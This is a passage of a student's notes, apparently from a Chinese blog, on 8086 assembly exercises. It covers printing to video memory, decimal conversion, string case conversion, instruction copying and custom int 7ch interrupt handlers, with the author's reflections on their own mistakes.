di mov ax,ds:[si+5] mov dx,ds:[si+7] call is_short_div call init_reg add di,10*2 call show_string pop di pop es pop si pop ds pop dx pop cx pop bx pop ax retshow_y: push ax push bx push cx push dx push ds push si push es push di mov ax,ds:[si+10] mov dx,0 call is_short_div call init_reg add di,2*20 call show_string pop di pop es pop si pop ds pop dx pop cx pop bx pop ax retshow_z: push ax push bx push cx push dx push ds push si push es push di mov ax,ds:[si+13] mov dx,0 call is_short_div call init_reg add di,2*40 call show_string pop di pop es pop si pop ds pop dx pop cx pop bx pop ax retis_short_div: mov cx,dx jcxz short_div call long_div jmp is_short_divdiv_ret: retshort_div: mov cx,10 div cx add dx,30h mov es:[bx],dl mov cx,ax jcxz div_ret mov dx,0 dec bx jmp short_div long_div: mov cx,10 push ax mov bp,sp mov ax,dx mov dx,0 div cx push ax mov ax,ss:[bp] div cx mov cx,dx add cx,30h mov es:[bx],cl dec bx pop dx add sp,2 retinit_reg: push ax mov ax,string mov ds,ax mov ax,0b800h mov es,ax pop ax retshow_string: push ax push bx push cx push dx push ds push si push es push dishowstring: mov cx,0 mov cl,ds:[bx] jcxz show_ret mov ch,2 mov es:[di],cx add di,2 inc bx jmp showstringshow_ret: pop di pop es pop si pop ds pop dx pop cx pop bx pop ax ret;======================================================= code endsend start;======================================================= 又写了一遍 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288;=======================================================assume cs:code , ds:data, ss:stack;=======================================================data segment;年份 db &#x27;1975&#x27;,&#x27;1976&#x27;,&#x27;1977&#x27;,&#x27;1978&#x27;,&#x27;1979&#x27;,&#x27;1980&#x27;,&#x27;1981&#x27; db &#x27;1982&#x27;,&#x27;1983&#x27;,&#x27;1984&#x27;,&#x27;1985&#x27;,&#x27;1986&#x27;,&#x27;1987&#x27;,&#x27;1988&#x27; db &#x27;1989&#x27;,&#x27;1990&#x27;,&#x27;1991&#x27;,&#x27;1992&#x27;,&#x27;1993&#x27;,&#x27;1994&#x27;,&#x27;1995&#x27; ;收入 dd 16,22,382,1356,2398,8000,16000 dd 24486,50065,97479,140417,197514,345980,590827 dd 803528,1183000,1843000,2759000,3753000,4649000,5937000 ;员工数量 dw 3,7,9,13,28,38,130 dw 220,476,778,1001,1442,2258,2793 dw 4037,5635,8226,11542,14438,15257,17800data ends table segment db 21 dup (&#x27;0123456789ABCDEF&#x27;) table ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack endsstring segment db 16 dup(0)string ends;=======================================================code segmentstart:;main code ;=======================================================;数据源S mov ax,data mov ds,ax ;数据地D mov ax,7e00h mov es,ax ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call clean_screen call init_table call work over: mov ax,4c00h int 21h;======================================================= ;functionclean_screen: mov ax,0b800h mov es,ax mov bx,0 mov cx,2000 mov dx,0700h clean: mov es:[bx],dx add bx,2 loop clean ret init_table: mov ax,data mov ds,ax mov ax,table mov es,ax mov cx,21 mov si,0 mov di,21*4*2 mov bx,0init_small: ;0123456789ABCDEF push ds:[si+0] pop es:[bx] push ds:[si+2] pop es:[bx+2] push ds:[si+21*4+0] pop es:[bx+5] push ds:[si+21*4+2] pop es:[bx+7] push ds:[di] pop es:[bx+10] mov ax,es:[bx+5] mov dx,es:[bx+7] div word ptr es:[bx+10] mov es:[bx+13],ax mov al,58 ;: mov es:[bx+4],al mov al,47 ;/ mov es:[bx+9],al mov al,61 ;= mov es:[bx+12],al add bx,16 add si,4 add di,2 loop init_small ret work: mov ax,table mov ds,ax mov ax,string mov es,ax mov cx,21 mov bx,0 mov si,0 mov di,160*3work_small: call show_year call show_x call show_y call show_z add di,160 add si,16 loop work_small retshow_year: push si push es push di push cx add di,10 mov ax,0b800h mov es,ax mov cx,4year_small: mov al,ds:[si] mov es:[di],al inc si add di,2 loop year_small mov al,ds:[4] mov es:[di],al mov al,ds:[9] mov es:[di+30],al mov al,ds:[12] mov es:[di+50],al pop cx pop di pop es pop si ret ;0123456789ABCDEFshow_x: push cx push di add di,40 mov ax,ds:[si+5] mov dx,ds:[si+7] mov bx,15 call is_short_div call show_string pop di pop cx retshow_y: push cx push di add di,60 mov ax,ds:[si+10] mov dx,0 mov bx,15 call is_short_div call show_string pop di pop cx retshow_z: push cx push di add di,80 mov ax,ds:[si+13] mov dx,0 mov bx,15 call is_short_div call show_string pop di pop cx ret is_short_div: mov cx,dx jcxz short_div call long_div jmp is_short_div div_ret: retshort_div: mov cx,10 div cx add dl,30h mov es:[bx],dl mov dl,0 mov es:[bx-1],dl dec bx mov cx,ax jcxz div_ret mov dx,0 jmp short_divlong_div: push ax mov bp,sp mov ax,dx mov dx,0 mov cx,10 div cx push ax mov ax,ss:[bp] div cx add dx,30h mov es:[bx],dl mov dl,0 mov es:[bx-1],dl dec bx pop dx add sp,2 ret show_string: push es push ds push di mov bx,15 mov ax,string mov ds,ax mov ax,0b800h mov es,axshow_str: mov ah,2 mov al,ds:[bx] mov es:[di],ax sub di,2 dec bx mov cx,0 mov cl,ds:[bx] jcxz show_ret jmp show_strshow_ret: pop di pop ds pop es ret ;======================================================= code endsend start;======================================================= 出现的问题 push的保存没注意先后顺序,也就是临时保存无效 对结构的化编程不是很清晰,老是走一步看一步 一个小小的寄存器错误,就导致中断,程序崩溃 如果数据溢出是会中断的,而不是报错 8086 课后实验模拟jcxz1234567891011121314151617181920212223242526272829303132333435363738394041424344454647;=======================================================assume cs:code , ds:data, ss:stack;=======================================================data segment db 256 dup(&#x27;A&#x27;) data ends ;=======================================================stack segment stack db 128 dup(&#x27;w&#x27;)stack ends;=======================================================code segment start: ;======================================================= ;栈 mov ax,stack mov ss,ax mov sp,128 ;数据段 mov ax,2000h mov ds,ax mov bx,0 ;======================================================= mov cx,10 mov al,1init: mov byte ptr ds:[bx], al inc bx inc al loop init mov bx,0fun: mov cl,byte ptr ds:[bx] jcxz over inc bx jmp fun ;======================================================= over: mov ax,4c00h int 21h;=======================================================code endsend start;======================================================= 还是要注意数据的初始化 另外要注意循环是哪里开始的,不要乱循环 关于loop与cx去检索数据段中0的位置123456789s:mov cl,ds:[bx]mov ch,0inc cxinc bxloop sok:dec bxmov dx,bx 它的检索,是靠bx++的来依次检索 但是又靠cx!&#x3D;0来推动检索 所以才达到避免cx单一化,又推动了片段的检索 代码要求是得到位置 因此最后会有一个 dec bx mov dx,bx 一个经典的指令复制实验-jmp指令的本质12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152;=======================================================assume cs:code ;======================================================= ;=======================================================;=======================================================code segment ;======================================================= mov ax,4c00h int 21hstart: mov ax,0s: nop nop mov di,offset s mov si,offset s2 mov ax,cs:[si] mov cs:[di],ax s0: jmp short s no_use: mov ax,0 int 21h mov ax,0 s2: jmp short no_use nop code endsend start ;======================================================= ;main code ;======================================================= ;fun area ;======================================================= ;=======================================================code endsend start;======================================================= 假如我们有指令 jmp s1 在复制jmp s1的时候 它不是复制jmp s1 而是复制他的汇编指令 加入它的指令是EBF6 F6-然后1111 0110然后取反0000 1001然后+1为然后0000 1010然后10进制为10 说明它以前往后面跳了10个位移 debug那个代码 以前的 1jmp short no_use 它的汇编就是EBF6,于是就复制了EBF6 可以看到,以前的nop,nop 变为了EBF6 那么的话 因为我们复制的是EBF6 不是复制jmp short ptr no_use 所以的话 出现jmp 0000也不要诧异 为什么是0000 因为 123...076A:0008 EBF6 jmp 0000076A:000A BF0800 mov di,0008 于是从000A处往上面从0开始数到10 就可以得到地址 0000 同时我们事先就安排好了,0000处是程序的结束位置 在屏幕中央显示带颜色的字符串‘welcome to masm’DOS窗口的 一行有160个字节 一共有25行 一页有4000个字节 一共有8页 偶数地址存放ASCII字符 基数地址存放字符的颜色 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374;=======================================================assume cs:code , ds:data, ss:stack;=======================================================data segment db &#x27;welcome to masm!&#x27; db 00000010b db 00100100b db 01110001b data ends ;=======================================================stack segment stack db 128 dup(&#x27;m&#x27;)stack ends;=======================================================code segmentstart: ;======================================================= ;栈 mov ax,stack mov ss,ax mov sp,128 ;数据源 mov ax,data mov ds,ax mov si,0 mov bx,16 ;数据目的地 mov ax,0B800h;显存的地址0xB800 mov es,ax mov di,160*12+30*2;第[12]行第[60]字节处;======================================================= ;main code jmp show over: mov ax,4c00h int 21h;======================================================= ;fun area show: mov cx,3;大循环3次 point: push cx push di mov cx,16;初始化小循环16次 mov si,0 mov dh,ds:[bx] ;规律是高位修改color颜色,低位修改ASCII字符,dh是奇数位,al是偶数位,连续地址 [00] [01] 中,在dx的排布是[01] [00]show_str: ;把ASCII与颜色依次打入显存 mov dl,ds:[si] mov es:[di],dx ;检索下一个字符 add di,2;传输是字符与颜色的共同传输 inc si;字符的检索 loop show_str pop di;还原di pop cx;还原大循环cx的次数 add di,160;把下行打入显存 inc bx;配置下一个颜色 loop point;再一次循环 jmp over ;=======================================================code endsend start;======================================================= 我自己再写一遍 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源Sdata segment db &#x27;welcome to masm!&#x27; db 00000010b db 00100100b db 01110001bdata ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack ends;=======================================================code segmentstart: ;main code ;======================================================= ;数据源S mov ax,data mov ds,ax mov si,0 ;si=0;si&lt;16;si++ mov bx,16 ;bx=0;bx&lt;3;bx++ ;数据地D mov ax,0B800h mov es,ax mov di,160*12+30*2 ;di=160*12+30*2;di&lt;xx+160*3;di+=160 ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= ;把颜色,ascii打入字符串当中 ;颜色在cx=3大循环中打入,ASCII在小循环cx=16中打入 ;用bx寻颜色 ;用si,di寻ASCII mov cx,3big: push cx;cx=3,在小循环cx=16,会用到 push di mov dh,ds:[bx] mov cx, 16 mov si,0 small: mov dl,ds:[si] mov es:[di],dx inc si add di,2 loop small pop di pop cx add di,160 inc bx loop big over: mov ax,4c00h int 21h;======================================================= ;function ;======================================================= code endsend start;======================================================= 出现的问题 没注意数据的长度,体现在 123456small: mov dl,ds:[si] mov es:[di],dx inc si inc di loop small 这里的话 应该是 add di,2 不是 di++ 复制的脚本1234567891011121314151617181920212223242526assume cs:codecode segment mov bx,0 mov cx,16 func: mov ax,0FFFFh mov ds,ax mov dl,ds:[bx] ;dl=[0xFFFF:bx] mov ax,0020h mov ds,ax mov ds:[bx],dl ;[0020:bx]=dl inc bx loop func mov ax,4c00h int 21hcode endsend 另外一种 1234567891011121314151617181920212223242526assume cs:codecode segment mov ax,0ffffh mov ds,ax ;ds 数据从哪里来 mov ax,0020h mov es,ax ;es 数据给到哪里去 mov bx,0 mov cx,16 func: mov dl,ds:[bx] ;取出来 mov es:[bx],dl ;放进去 inc bx ;遍历 loop func mov ax,4c00h int 21hcode endsend 指令复制12345678910111213141516171819202122232425262728293031323334353637383940assume cs:code data segment db 256 dup(&#x27;A&#x27;) data ends stack segment stack db 128 dup(&#x27;w&#x27;)stack endscode segmentstart: ;ss初始化 mov ax,stack mov ss,ax mov sp,128 s: mov ax,bx mov si,offset s mov di, offset s0 mov dx,cs:[si] mov cs:[di],dx s0: nop nop end: mov ax,4c00h int 21hcode endsend start 这里只是复制了一条指令 把指令 17行的指令 mov ax,bx占2个字节 复制到 29行处 mov ax,bx 你也可以通过循环复制多条指令 但是,指令的长度,你必须要好好考虑一下 打印小写与大写字符串类型一 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源Sdata segment db &#x27;dengquxiang are&#x27;,0data ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack ends;=======================================================code segmentstart: ;main code ;======================================================= ;数据源S mov ax,data mov ds,ax mov si,0 mov bx,0 ;数据地D mov ax,7e00h mov es,ax mov di,0 ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call init_reg call clean_screen call show_small call init_big call show_big over: mov ax,4c00h int 21h;======================================================= ;functioninit_reg: mov bx,data mov ds,bx mov bx,0b800h mov es,bx retclean_screen: mov bx,0 mov dx,0700h mov cx,2000cleanscreen: mov es:[bx],dx add bx,2 loop cleanscreen retshow_small: mov si,0 mov di,160*10+30*2 call show_str ret show_str: push cx push ds push es push si push di mov cx,0showstr: mov cl,ds:[si] jcxz show_ret mov es:[di],cl add di,2 inc si jmp showstr ret show_ret: pop di pop si pop es pop ds pop cx retinit_big: mov si,0 call capital retcapital: push cx push ds push si push di mov cx,0point: mov cl,ds:[si] jcxz capital_ret and byte ptr ds:[si],11011111b inc si jmp point capital_ret: pop di pop si pop ds pop cx retshow_big: mov si,0 mov di,160*11+30*2 call show_str ret;======================================================= code endsend start;======================================================= 我写的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源Sdata segment db &#x27;tinyxiangxiangs&#x27;,0data ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack ends;=======================================================code segmentstart: ;main code ;======================================================= ;数据源S mov ax,data mov ds,ax mov si,0 mov bx,0 ;数据地D mov ax,7e00h mov es,ax mov di,0 ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= ;初始化指向;显示数据;修改数据;显示数据;数据显示是一个函数 call init_reg call init_screen call show_small call show_big over: mov ax,4c00h int 21h;======================================================= ;function ;0700h是默认颜色 160*10+30*2是显示的位置,显存的地址0b800hinit_reg: ;指向的地址 mov ax,0b800h mov es,ax mov si,0;si+=1 mov di,160*10+30*2;di+=2 retinit_screen: mov cx,2000 mov ax,0 push di mov di,0loop1: mov es:[di],ax add di,2 loop loop1 pop di ret show_small: push si push di mov cx,16 mov ah,11011111bloop2: mov al,ds:[si] mov es:[di],ax inc si add di,2 loop loop2 pop di pop si ret show_big: push si push di mov di,160*11+30*2 mov cx,16 mov ah,11011111bloop3: mov al,ds:[si] and al,11011111b mov es:[di],ax inc si add di,2 loop loop3 pop di pop di ret ;======================================================= code endsend start;======================================================= 类型2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源Sdata segment db &#x27;wind&#x27;,0 db &#x27;good&#x27;,0 db &#x27;word&#x27;,0 db &#x27;unix&#x27;,0data ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack ends;=======================================================code segmentstart: ;main code ;======================================================= ;数据源S mov ax,data mov ds,ax mov si,0 mov bx,0 ;数据地D mov ax,7e00h mov es,ax mov di,0 ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call init_reg call clean_screen call make_bigblack: mov ax,1000h jmp black over: mov ax,4c00h int 21h;======================================================= ;functioninit_reg: mov bx,data mov ds,bx mov bx,0b800h mov es,bx retclean_screen: mov bx,0 mov dx,0700h mov cx,2000cleanscreen: mov es:[bx],dx add bx,2 loop cleanscreen ret make_big: mov si,0 mov di,160*10+30*2 mov cx,4makebig: call show_str call capital_letter call show_word add di,160 add si,5 loop makebig retshow_str: push cx push ds push es push di push si mov cx,0 showstr: mov cl,ds:[si] jcxz show_str_ret mov es:[di],cl add di,2 inc si jmp showstrshow_str_ret: pop si pop di pop es pop ds pop cx ret capital_letter: push cx push ds push si push di mov cx,0capitalletter: mov cl,ds:[si] jcxz capital_ret and byte ptr ds:[si],11011111b inc si jmp capitalletter capital_ret: pop di pop si pop ds pop cx ret show_word: push di add di,10*2 call show_str pop di ret ;======================================================= code endsend start;======================================================= 我写的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源Sdata segment db &#x27;wind&#x27;,0 db &#x27;good&#x27;,0 db &#x27;word&#x27;,0 db &#x27;unix&#x27;,0 db 0,0,0,0,0 ;5个5个的循环,160++的显示data ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack ends;=======================================================code segmentstart: ;main code ;======================================================= ;数据源S mov ax,data mov ds,ax mov si,0 mov bx,0 ;数据地D mov ax,7e00h mov es,ax mov di,0 ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call init_reg call clean_screen call show_small call show_big over: mov ax,4c00h int 21h;======================================================= ;functioninit_reg: mov ax,0b800h mov es,ax mov di,160*10+30*2 ret;=======================================================clean_screen: mov cx,2000 mov ax,0700h push di mov di,0lop1: mov es:[di],ax add di,2 loop lop1 pop di ret;=======================================================show_small: mov si,0 mov bx,si ;大循环 push dilop3: mov cx,0 mov cl,ds:[bx] jcxz small_ret push di ;小循环lop2: mov cl,0 mov cl,ds:[si] jcxz lop2_out mov es:[di],cl mov byte ptr es:[di+1],11011111b inc si add di,2 jmp lop2lop2_out: pop di add di,160 add bx,5 inc si ;容易忽略 jmp lop3small_ret: pop di ret;=======================================================show_big: mov bx,0 mov cx,0 mov si,0 mov di,160*10+30*2+12;本身就存在10个字节的长度,ASCII+颜色,就是2个字节,并且di的位置起点必须还是偶数,否则后面的数据会错位填补 mov bx,si ;大循环 push dilop5: mov cx,0 mov cl,ds:[bx] jcxz big_ret push di ;小循环lop4: mov cl,0 mov cl,ds:[si] jcxz lop4_out and cl,11011111b mov es:[di],cl mov byte ptr es:[di+1],11011111b inc si add di,2 jmp lop4lop4_out: pop di add di,160 add bx,5 inc si ;容易忽略 jmp lop5big_ret: pop di ret ;======================================================= code endsend start;======================================================= 没有去注意数据的位置有何意义,也没有注意数据的长度 打印一个字符串12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源Sdata segment db &#x27;welcome to masm!&#x27;,0 data ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack ends;=======================================================code segmentstart: ;main code ;======================================================= ;数据源S mov ax,data mov ds,ax mov si,0 mov bx,0 ;数据地D mov ax,7e00h mov es,ax mov di,0 ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call init_reg call show over: mov ax,4c00h int 21h;======================================================= ;functioninit_reg: mov dh,23 mov dl,3 mov cl,2 mov ax,0b800h mov es,ax mov ax,0 mov al,dh mov bx, 160 mul bx mov di,ax mov al,dl mov bx,0 mov bl,2 mul bl add di,ax retshow: mov cx,0 mov cl,ds:[si] jcxz show_ret mov ch,2 mov es:[di],cx add di,2 inc si jmp showshow_ret: ret ;======================================================= code endsend start;======================================================= 出现的问题 对于cx中带颜色,jcxz怎么办 jcxz中jmp的位置不对 jcxz发现cx一直不为0,woc 直接用 mov di,160*23+6 这样更快 源代码-&gt;ASCII的打印123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源Sdata segment dd 0ffffh,5678,65535,0data ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack ends;=======================================================code segmentstart: ;main code ;======================================================= ;数据源S mov ax,data mov ds,ax mov si,0 mov bx,0 ;数据地D mov ax,7e00h mov es,ax mov di,0 ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call init_reg call show_number over: mov ax,4c00h int 21h;======================================================= ;functioninit_reg: mov ax,0b800h mov es,ax retBreak_Up_Digit: ;将数字, 好比1234, 利用%的方法去分解为 ,1 2, 3, 4, 然后打入显存 push ax push bx push cx push dx push ds push es push si push di ;初始化 被除数 / 除数 = ? mov ax,ds:[si] mov dx,ds:[si+2] mov bx,10lp1: div bx mov dh,2 add dl,30h ;余数-&gt;ASCII mov es:[di],dx ;ASCII-显存 sub di,2 ;右往左依次填补 mov cx,ax ;取商到 cx jcxz fun_ret ;如果商为0,就退出-&gt;当数据本身就是0,也不影响它的输出 mov dx,0 ;清空dx,它本身用来装东西的 jmp lp1fun_ret: pop di pop si pop es pop ds pop dx pop cx pop bx pop ax retshow_number: mov si,0 mov di,160*10+40*2 mov cx,4 ;我们有4行数据shownumber: call Break_Up_Digit add si,4 ;指向数据段的下一个word数据 add di,160 ;显示在下一行 loop shownumber ;循环往复 ret;======================================================= code endsend start;======================================================= 里面用到了看数的分解 用32位除法的余数dx去有效的代替%,那么就可以自动的判断了 我自己写的 怎么处理 over_flow 除法?????? 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源Sdata segment db 01,02,03,04,05,06,07,08,09,10 ;所以要10次? data ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack ends;=======================================================code segmentstart: ;main code ;======================================================= ;数据源S mov ax,data mov ds,ax mov si,0 mov bx,0 ;数据地D mov ax,7e00h mov es,ax mov di,0 ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call Init_Reg call Show_Data over: mov ax,4c00h int 21h;======================================================= ;functionInit_Reg: mov ax,0b800h mov es,ax mov di,10*160+30*2 retShow_Data: ;采用数分解的方式 mov cx,10 mov si,0 mov bx,0 lp2: push cx push di mov ah,0 mov al,ds:[si] mov dx,0 mov bx,10 ;余数在dx中lp1: div bx add dl,30h mov dh,2 mov es:[di],dx mov cx,ax jcxz continue_x sub di,2 mov dx,0 jmp lp1 continue_x: pop di pop cx add di,160 inc si loop lp2 ret ;======================================================= code endsend start;======================================================= 出现的问题 对循环而言,不知道那些指令是要循环的,哪些指令它是不需要循环的 对数据经不起考验,也就是代码不严谨 好比对于除法,每一次它的计算,你最好要去初始化一下,否者很容易数据错位而算出奇奇怪怪的东西 屏幕复制12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源S data segment db 128 dup(&#x27;x&#x27;) data ends ;=======================================================;栈段 stack segment stack db 128 dup(&#x27;y&#x27;) stack ends;=======================================================code segmentstart:;main code ;=======================================================;数据源S mov ax,data mov ds,ax ;数据地D mov ax,7e00h mov es,ax ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call init_reg call cpy_screen over: mov ax,4c00h int 21h;======================================================= ;functioninit_reg: mov bx,0b800h mov ds,bx mov es,bx retcpy_screen: mov cx,24 mov si,160 mov di,0cpy_screen_cmd: push cx push si push di mov cx,80 cld rep movsw pop di pop si pop cx add si,160 add di,160 loop cpy_screen_cmd ret ;======================================================= code endsend start;======================================================= 指令复制1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源S data segment db 128 dup(&#x27;x&#x27;) data ends ;=======================================================;栈段 stack segment stack db 128 dup(&#x27;y&#x27;) stack ends;=======================================================code segmentstart:;main code ;=======================================================;数据源S mov ax,data mov ds,ax ;数据地D mov ax,7e00h mov es,ax ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call copy_cmd over: mov ax,4c00h int 21h;======================================================= ;functioncmd: mov ax,10 mov ax,10 mov ax,10 mov ax,10 mov ax,10cmd_end: nopcopy_cmd: mov bx,cs mov ds,bx mov si,offset cmd mov bx,0 mov es,bx mov di,7e00h mov cx,offset cmd_end-cmd cld rep movsb ret ;======================================================= code endsend start;======================================================= Copy_Code函数用到了几个参数 1CX :代表了循环的次数 12cld rep movsb 代表了复制的功能 sb就是byte的一种复制 12ds:[si]es:[di] 要复制什么代码 复制到哪里去 用中断模拟没有loop 的的loop它的原理是修改栈里的IP 然后pop出去被修改的IP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879assume cs:code , ss:stackstack segment db 32 dup(&#x27;0&#x27;)stack endscode segmentstart: mov ax,stack mov ss,ax; mov sp,32 call init_do7ch;他只会push ip mov ax,0b800h mov es,ax mov di,160*12 mov bx,offset s - offset send mov cx,8 s: mov byte ptr es:[di+0],&#x27;!&#x27; mov byte ptr es:[di+1],2 add di,2 int 7ch send: nop mov ax,4c00h int 21h;----------------------------------------------------------------------------------------------------------------- init_do7ch: ;先是修改数据的指向,然后是复制中断代码到中断区,中断区域的调用是自动的 ;-------------------------------------------- ;设置数据来源 S指-&gt;CS:[do7ch] mov ax,cs mov ds,ax mov si,offset do7ch;这样取地址就非常的妙..不想你之前根本想不到 ;设置数据D-&gt;0000:[0200] mov ax,0 mov es,ax mov di,200h mov cx,offset do7chend - offset do7ch;循环的次数 cld rep movsb ;数据指向完成后,初始化一下中断向量表,第[0]个向量表的地址0000:0200 mov ax,0 mov es,ax mov word ptr es:[7ch*4+0],200h mov word ptr es:[7ch*4+2],0 ret ;-------------------------------------- do7ch: push bp mov bp,sp;因为这里让bp发生了改变...所以我们要保存bp的初始化值 dec cx jcxz lpret add ss:[bp+2],bx;woc,这里不是默认的ds: lpret: pop bp iret do7chend: nopcode endsend start 在一定的光标位置显示字符1234567891011121314151617181920212223242526272829303132333435assume cs:code,ss:stackstack segment db 128 dup(&#x27;y&#x27;)stack endscode segmentstart: mov ax,stack mov ss,ax mov sp,128 ;bh 总 是 代 表 着 页 数 ;ah总 是 代 表 着 编 号 mov ah,2 mov bh,0 mov dh,5 mov dl,2 int 10h mov ah,9 mov al,&#x27;a&#x27; mov bl,11001010b mov bh,0 mov cx,6 int 10h mov ax,4c00h int 21hcode endsend start int 7ch 计算sqrt1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768assume cs:code , ss:stackstack segment db 128 dup(&#x27;y&#x27;)stack endscode segmentstart: mov ax,stack mov ss,ax; mov sp,128 call init_do7ch;他只会push ip mov ax,8 int 7ch add ax,ax adc dx,dx mov ax,4c00h int 21h ;----------------------------------------------------------------------------------------------------------------- init_do7ch: ;先是修改数据的指向,然后是复制中断代码到中断区,中断区域的调用是自动的 ;-------------------------------------------- ;设置数据来源 S指-&gt;CS:[do7ch] mov ax,cs mov ds,ax mov si,offset do7ch;这样取地址就非常的妙..不想你之前根本想不到 ;设置数据D-&gt;0000:[0200] mov ax,0 mov es,ax mov di,200h mov cx,offset do7chend - offset do7ch;循环的次数 cld rep movsb ;数据指向完成后,初始化一下中断向量表,第[0]个向量表的地址0000:0200 mov ax,0 mov es,ax mov word ptr es:[7ch*4+0],200h mov word ptr es:[7ch*4+2],0 ret ;-------------------------------------- do7ch: mul ax iret do7chend: nopcode endsend start int 7ch 大小写转化12345678910111213141516171819202122232425262728293031323334353637383940414243444546assume cs:code , ss:stackstack segment db 16 dup(&#x27;0&#x27;)stack endscode segmentstart: mov ax,stack mov ss,ax; mov sp,16 ;只是设置一个光标 mov ah,2 mov bh,0 mov dh,5 mov dl,12 int 10h ;只修改颜色配置的属性然后输出对应的字符串 mov ah,9 mov al,&#x27;&amp;&#x27; mov bl,11001010b mov bh,0 mov cx,3 int 10h ;call int_7ch mov ax,4c00h int 21h code endsend start 手写实现 int21h的ah&#x3D;9打印字符串的函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798assume cs:code , ss:stack ,ds:datastack segment db 16 dup(&#x27;0&#x27;)stack endsdata segment db &quot;hello! I am Dqx-Gh0st...weclome to my world&quot;,0data endscode segmentstart: mov ax,stack mov ss,ax mov sp,16 call init_do7ch ;行号 mov dh,10 ;列好 mov dl,10 ;颜色 mov cl,11001010b ;数据源 mov ax,data mov ds,ax mov si,0 int 7ch mov ax,4c00h int 21h init_do7ch: mov ax,cs mov ds,ax mov si, offset do7ch_start mov ax,0 mov es,ax mov di,200h mov cx,offset do7ch_end - offset do7ch_start cld rep movsb mov word ptr es:[7ch*4+0],200h mov word ptr es:[7ch*4+2],0 ret do7ch_start: mov ax,0b800h mov es,ax mov ax,0 mov al,160 mul dh ;结果放在ax中 mov di,ax mov ax,0 mov al,2 mul dl ;又得到数据放在了ax中 add di,ax s: push cx mov cx,0 mov cl,ds:[si] jcxz retend pop cx;还原那个颜色属性的配置...cl mov ch,ds:[si];再次赋予数据 mov byte ptr es:[di+0],ch mov byte ptr es:[di+1],cl add di,2 inc si jmp s retend: add sp,2;这里会比较容易的去忘记.....只管跑...东西都忘记了拿 iret do7ch_end:nop code endsend start 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172assume cs:code , ss:stack ,ds:datastack segment db 16 dup(&#x27;0&#x27;)stack endsdata segment db &quot;123456789&quot;,0data endscode segmentstart: mov ax,stack mov ss,ax mov sp,16 call init_do7ch mov ax,0b800h mov es,ax mov di,160*12 mov bx, offset send - offset s mov cx,10 s: mov byte ptr es:[di+0],&#x27;?&#x27; mov byte ptr es:[di+1],2 add di,2 int 7ch send:nop mov ax,4c00h int 21h init_do7ch: mov ax,cs mov 